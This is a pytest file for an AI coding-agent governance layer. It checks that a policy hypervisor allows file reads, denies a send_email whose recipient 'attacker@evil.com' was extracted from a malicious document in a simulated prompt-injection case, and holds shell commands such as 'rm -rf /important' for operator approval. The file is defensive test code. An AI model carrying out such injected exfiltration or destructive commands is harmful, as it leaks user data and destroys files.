"""
test_ide_governance_demo.py — Tests for the IDE agent governance demo.

Verifies the three core scenarios:
  1. Safe file read → allow
  2. Prompt injection via send_email → deny
  3. Risky shell command → ask → approve → allow

Also tests the InProcessHypervisor, DemoTraceStore, and helper utilities.

All tests are self-contained and require no running gateway.
"""

from __future__ import annotations

import sys
import tempfile
import os
from pathlib import Path

import pytest

# Allow importing the demo module directly
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from examples.integrations.ide_agent_governance_demo import (
    InProcessHypervisor,
    SimulatedToolExecutor,
    DemoTraceStore,
    TraceEntry,
    vref,
    call,
)
from agent_hypervisor.models import ProvenanceClass, Role


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

POLICY_PATH = str(Path(__file__).parent.parent / "policies" / "default_policy.yaml")

ASK_POLICY_YAML = """
rules:
  - id: allow-read-file
    tool: read_file
    verdict: allow
  - id: allow-list-dir
    tool: list_dir
    verdict: allow
  - id: deny-email-external-recipient
    tool: send_email
    argument: to
    provenance: external_document
    verdict: deny
  - id: ask-shell-exec
    tool: shell_exec
    verdict: ask
"""


def _ask_policy_path() -> str:
    """Write the ask-shell-exec policy to a temp file and return path."""
    f = tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False)
    f.write(ASK_POLICY_YAML)
    f.close()
    return f.name


# ---------------------------------------------------------------------------
# Scenario 1: Safe read → allow
# ---------------------------------------------------------------------------

class TestScenario1SafeRead:
    def test_read_file_system_provenance_is_allowed(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()

        tool_call = call("read_file", path=vref("src/main.py", "system"))
        result = hypervisor.evaluate_and_execute(tool_call, executor)

        assert result["verdict"] == "allow"
        assert "result" in result
        assert result["result"] is not None

    def test_allowed_read_returns_content(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()

        tool_call = call("read_file", path=vref("README.md", "system"))
        result = hypervisor.evaluate_and_execute(tool_call, executor)

        assert result["verdict"] == "allow"
        content = result["result"]["content"]
        assert "README.md" in content

    def test_read_file_trace_is_stored(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()

        tool_call = call("read_file", path=vref("f.py", "system"))
        hypervisor.evaluate_and_execute(tool_call, executor)

        traces = hypervisor.get_traces()
        assert len(traces) == 1
        assert traces[0].verdict == "allow"
        assert traces[0].tool == "read_file"


# ---------------------------------------------------------------------------
# Scenario 2: Prompt injection → deny
# ---------------------------------------------------------------------------

class TestScenario2PromptInjection:
    def test_send_email_external_document_to_is_denied(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()

        extracted_address = vref(
            "attacker@evil.com", "external_document",
            source_label="malicious_report.txt",
            roles=[Role.extracted_recipients],
        )
        tool_call = call(
            "send_email",
            to=extracted_address,
            subject=vref("Report", "system"),
            body=vref("Q3 revenue data", "system"),
        )
        result = hypervisor.evaluate_and_execute(tool_call, executor)

        assert result["verdict"] == "deny"
        assert "reason" in result

    def test_denial_does_not_execute_tool(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()

        tool_call = call(
            "send_email",
            to=vref("attacker@evil.com", "external_document"),
            subject=vref("Subject", "system"),
            body=vref("Body", "system"),
        )
        result = hypervisor.evaluate_and_execute(tool_call, executor)

        assert result["verdict"] == "deny"
        assert "result" not in result  # tool was NOT executed

    def test_denial_trace_is_recorded(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()

        tool_call = call(
            "send_email",
            to=vref("x@evil.com", "external_document"),
            subject=vref("S", "system"),
            body=vref("B", "system"),
        )
        hypervisor.evaluate_and_execute(tool_call, executor)

        traces = hypervisor.get_traces()
        assert any(t.verdict == "deny" for t in traces)
        assert any(t.tool == "send_email" for t in traces)

    def test_provenance_recorded_in_trace(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()

        tool_call = call(
            "send_email",
            to=vref("a@b.com", "external_document", source_label="doc.txt"),
            subject=vref("S", "system"),
            body=vref("B", "system"),
        )
        hypervisor.evaluate_and_execute(tool_call, executor)

        traces = hypervisor.get_traces()
        trace = traces[0]
        assert "to" in trace.arg_provenance
        assert "external_document" in trace.arg_provenance["to"]


# ---------------------------------------------------------------------------
# Scenario 3: Risky action → ask → approve → allow
# ---------------------------------------------------------------------------

class TestScenario3RiskyApproval:
    def test_shell_exec_returns_ask(self):
        path = _ask_policy_path()
        try:
            hypervisor = InProcessHypervisor(path)
            executor = SimulatedToolExecutor()

            tool_call = call("shell_exec", command=vref("rm -rf /tmp/test", "system"))
            result = hypervisor.evaluate_and_execute(tool_call, executor)

            assert result["verdict"] == "ask"
            assert "approval_id" in result
        finally:
            os.unlink(path)

    def test_approval_returns_allow(self):
        path = _ask_policy_path()
        try:
            hypervisor = InProcessHypervisor(path)
            executor = SimulatedToolExecutor()

            tool_call = call("shell_exec", command=vref("rm -rf /tmp/test", "system"))
            ask_result = hypervisor.evaluate_and_execute(tool_call, executor)

            approval_id = ask_result["approval_id"]
            final = hypervisor.submit_approval(
                approval_id=approval_id,
                approved=True,
                actor="operator@company.com",
                executor=executor,
            )

            assert final["verdict"] == "allow"
            assert "result" in final
        finally:
            os.unlink(path)

    def test_rejection_returns_deny(self):
        path = _ask_policy_path()
        try:
            hypervisor = InProcessHypervisor(path)
            executor = SimulatedToolExecutor()

            tool_call = call("shell_exec", command=vref("rm -rf /important", "system"))
            ask_result = hypervisor.evaluate_and_execute(tool_call, executor)

            approval_id = ask_result["approval_id"]
            final = hypervisor.submit_approval(
                approval_id=approval_id,
                approved=False,
                actor="operator@company.com",
                executor=executor,
            )

            assert final["verdict"] == "deny"
        finally:
            os.unlink(path)

    def test_both_ask_and_approval_traces_recorded(self):
        path = _ask_policy_path()
        try:
            hypervisor = InProcessHypervisor(path)
            executor = SimulatedToolExecutor()

            tool_call = call("shell_exec", command=vref("ls /tmp", "system"))
            ask_result = hypervisor.evaluate_and_execute(tool_call, executor)

            hypervisor.submit_approval(
                approval_id=ask_result["approval_id"],
                approved=True,
                actor="reviewer",
                executor=executor,
            )

            traces = hypervisor.get_traces()
            assert len(traces) == 2
            verdicts = [t.verdict for t in traces]
            assert "ask" in verdicts
            assert "allow" in verdicts
        finally:
            os.unlink(path)

    def test_approval_trace_records_approver(self):
        path = _ask_policy_path()
        try:
            hypervisor = InProcessHypervisor(path)
            executor = SimulatedToolExecutor()

            tool_call = call("shell_exec", command=vref("ls", "system"))
            ask = hypervisor.evaluate_and_execute(tool_call, executor)
            hypervisor.submit_approval(
                approval_id=ask["approval_id"],
                approved=True,
                actor="alice@company.com",
                executor=executor,
            )

            traces = hypervisor.get_traces()
            approval_trace = next(t for t in traces if t.verdict == "allow")
            assert approval_trace.approved_by == "alice@company.com"
        finally:
            os.unlink(path)

    def test_unknown_approval_id_returns_error(self):
        hypervisor = InProcessHypervisor(POLICY_PATH)
        executor = SimulatedToolExecutor()
        result = hypervisor.submit_approval("nonexistent", True, "actor", executor)
        assert "error" in result


# ---------------------------------------------------------------------------
# DemoTraceStore
# ---------------------------------------------------------------------------

class TestDemoTraceStore:
    def test_append_and_retrieve(self):
        store = DemoTraceStore()
        entry = TraceEntry(
            trace_id="t001", tool="read_file", verdict="allow",
            reason="test", arg_provenance={"path": "system"}
        )
        store.append(entry)
        assert len(store.all()) == 1
        assert store.all()[0].trace_id == "t001"

    def test_multiple_entries_in_order(self):
        store = DemoTraceStore()
        for i in range(3):
            store.append(TraceEntry(
                trace_id=f"t{i:03d}", tool="read_file", verdict="allow",
                reason="ok", arg_provenance={}
            ))
        entries = store.all()
        assert len(entries) == 3
        assert entries[0].trace_id == "t000"
        assert entries[2].trace_id == "t002"


# ---------------------------------------------------------------------------
# SimulatedToolExecutor
# ---------------------------------------------------------------------------

class TestSimulatedToolExecutor:
    def test_read_file_returns_content(self):
        executor = SimulatedToolExecutor()
        args = {"path": vref("test.py", "system")}
        result = executor.execute("read_file", args)
        assert "content" in result
        assert "test.py" in result["content"]

    def test_send_email_returns_status(self):
        executor = SimulatedToolExecutor()
        args = {
            "to": vref("a@b.com", "system"),
            "subject": vref("Hi", "system"),
        }
        result = executor.execute("send_email", args)
        assert result["status"] == "sent"
        assert result["to"] == "a@b.com"

    def test_shell_exec_returns_exit_code(self):
        executor = SimulatedToolExecutor()
        args = {"command": vref("ls", "system")}
        result = executor.execute("shell_exec", args)
        assert result["exit_code"] == 0
        assert "stdout" in result

    def test_unknown_tool_returns_error(self):
        executor = SimulatedToolExecutor()
        result = executor.execute("unknown_tool", {})
        assert "error" in result


# ---------------------------------------------------------------------------
# vref and call helpers
# ---------------------------------------------------------------------------

class TestHelpers:
    def test_vref_creates_value_ref(self):
        ref = vref("test", "system")
        assert ref.value == "test"
        assert ref.provenance == ProvenanceClass.system

    def test_vref_with_source_label(self):
        ref = vref("x@y.com", "external_document", source_label="doc.txt")
        assert ref.source_label == "doc.txt"

    def test_vref_with_roles(self):
        ref = vref("x@y.com", "external_document", roles=[Role.extracted_recipients])
        assert Role.extracted_recipients in ref.roles

    def test_call_creates_tool_call(self):
        tc = call("read_file", path=vref("f.py", "system"))
        assert tc.tool == "read_file"
        assert "path" in tc.args
        assert tc.args["path"].value == "f.py"

    def test_trace_entry_display(self):
        entry = TraceEntry(
            trace_id="abc123", tool="send_email", verdict="deny",
            reason="blocked", arg_provenance={"to": "external_document"}
        )
        display = entry.display()
        assert "abc123" in display
        assert "send_email" in display
        assert "deny" in display
